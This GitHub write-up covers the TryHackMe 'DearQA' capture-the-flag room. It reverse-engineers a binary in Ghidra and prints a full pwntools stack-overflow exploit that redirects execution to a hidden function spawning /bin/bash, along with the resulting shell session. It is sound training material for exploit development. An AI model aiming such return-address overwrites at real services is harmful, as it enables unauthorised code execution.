<h1 align="center">Dear QA</h1>
<p align="center">2025, October 6<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>518</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Are you able to solve this challenge involving reverse engineering and exploit development</em>?<br>
<img width="80px" src="https://github.com/user-attachments/assets/13596c97-ee72-42ab-bafe-b14143899c16"><br>
Access it <a href="https://tryhackme.com/room/dearqa">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/35e1f695-2de0-4d3c-8a35-3f89333bfbdb"></p>

<br>
<br>
<h2>Task 1 . Binary Download</h2>
<p>Download the binary by clicking the Download Task Files button.</p>

<p>[ Download Task Files ]</p>

<p><em>Answer the question below</em></p>

<p>1.1. Analyze the binary offline<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . Challenge Flag</h2>
<p>There's a service running on port 5700. Start the machine using the green button on this task.</p>
<p>[ Start Machone ]</p>

<p><em>Answer the questions below</em></p>

<p>2.1. What is the binary architecture?<br>
<code>x64</code></p>
<br>

<p>2.2. What is the flag?<br>
<code>THM{***_**_****_****}</code></p>

<p>
  
- identified <strong>ELF 64-bit LSB executable, x86-64, ...</strong><br>
- <strong>x86-64</strong> = <strong>x64</strong> describe the same underlying 64-bit CPU architecture that extends the 32-bit x86</p>

```bash
$ file DearQA.DearQA
DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```

<img width="1793" height="789" alt="image" src="https://github.com/user-attachments/assets/66312da5-936b-4cdb-82f5-a6da643d6566" />

<br>
<br>
<br>

```bash
$ checksec --file=DearQA.DearQA
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   71 Symbols        No    0               1               DearQA.DearQA
```

```bash
$ ./DearQA.DearQA
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: AAAAAAAA
Hello: AAAAAAAA
```

<p>

- provided a huge sequence of A´s<br>
- identified <strong>Segmentation fault (core dumped)</p>

```bash
$ ./DearQA.DearQA
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

<br>
<p>
  
- launched <strong>Ghidra</strong></p>

<img width="1330" height="210" alt="image" src="https://github.com/user-attachments/assets/64043c16-67d8-4670-9535-a1b549216554" />

<br>
<br>
<br>
<p>
  
- <strong>main()</strong> function<br>
- <code>undefined local_28 [32];</code> declares a local buffer of <strong>32</strong> bytes on the stack<br>
- there is a hint in offset: 0x28 = <strong>40</strong> bytes from the base pointer (RBP)<br>
- so we know the buffer occupies <strong>32</strong> bytes, and there's <strong>8</strong> bytes between the buffer and the return address (usually the saved RBP).<br>
- if input > <strong>32</strong> bytes --> overflow into adjacent stack memory<br>
- <code>__isoc99_scanf(&DAT_00400851, local_28);</code> = is a  is a scanf() that calls with a format string at DAT_00400851<br><br><br>
local_28 = <strong>32</strong> bytes
saved RBP =  <strong>8</strong> bytes
return address =  next <strong>8</strong> bytes</p>


```bash
undefined8 main(void)

{
  undefined local_28 [32];
  
  puts("Welcome dearQA");
  puts("I am sysadmin, i am new in developing");
  printf("What's your name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400851,local_28);
  printf("Hello: %s\n",local_28);
  return 0;
}
```

<img width="1791" height="886" alt="image" src="https://github.com/user-attachments/assets/8aa89c9d-3035-4089-a524-01e10de382f8" />

<br>
<br>
<br>
<p>
  
-  <strong>vuln()</strong> function address is <strong>00400686</strong> = 0x400686</p>

```bash
void vuln(void)

{
  puts("Congratulations!");
  puts("You have entered in the secret function!");
  fflush(stdout);
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
```

<img width="1796" height="788" alt="image" src="https://github.com/user-attachments/assets/4832e206-88ea-4a25-8d03-774a9739bddd" />


<br>
<br>
<br>
<p>
  
- <strong>Search</strong> > <strong>For Strings ...</strong></p>

<img width="1448" height="664" alt="image" src="https://github.com/user-attachments/assets/2fed4dea-1f87-4ac3-88c7-7f7d2fb6df50" />

<br>
<br>
<br>

<p>

- crafted a Python script <strong>script.py</strong><br>
- started the challenge´s VM´s<br>
- executed <strong>script.py</strong><br></p>

<p><strong>script.py</strong></p>

```bash
from pwn import *

# Connect to the remote service
con = remote('xx.xxx.xx.xxx', 5700)

# Address of vuln() function (double-check this in Ghidra)
vuln_addr = p64(0x400686)

# Craft payload
payload  = b'A' * 32        # Overflow buffer
payload += b'B' * 8         # Overwrite saved RBP
payload += vuln_addr        # Overwrite return address

# Send payload
con.recvuntil("What's your name: ")
con.sendline(payload)

# Drop to interactive shell
con.interactive()
```


```bash
:~/DearQA# python3 script.py
[+] Opening connection to xx.xxx.xx.xxx on port 5700: Done
...
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86^F@^@^@^@^@^@
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06@
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group (659): Inappropriate ioctl for device
bash: no job control in this shell
ctf@...:/home/ctf$ $ id
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
```

```bash
ctf@...:/home/ctf$ $ pwd
pwd
/home/ctf
```

```bash
ctf@...:/home/ctf$ $ ls
ls
DearQA	dearqa.c  flag.txt
```

```bash
ctf@...:/home/ctf$ $ cat flag.txt
cat flag.txt
THM{***_**_****_****}
```

<img width="1232" height="492" alt="image" src="https://github.com/user-attachments/assets/22225f9b-3c77-4af3-948a-ba0c13979f7c" />

<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7698b2c9-2475-4cb5-a508-3ec14530b69a"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/d696369b-34c0-4dba-95e5-b102a4efa1c0"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>
<br>


<p align="center">Global All Time:   105ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/a329058b-00e5-4a98-b2eb-6e4d3657401c"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/0ecf0503-0996-4135-8e93-27789ee4766e"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/cf412389-d430-46a7-81af-d92042257472"><br>
                  Global monthly:     333ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/c1b3bf78-9c54-4950-aa4b-80977c1d05ff"><br>
                  Brazil monthly:       6ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/107f0f9d-3e8a-4d2d-8bc0-44b95e0dcdc8"><br>


<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
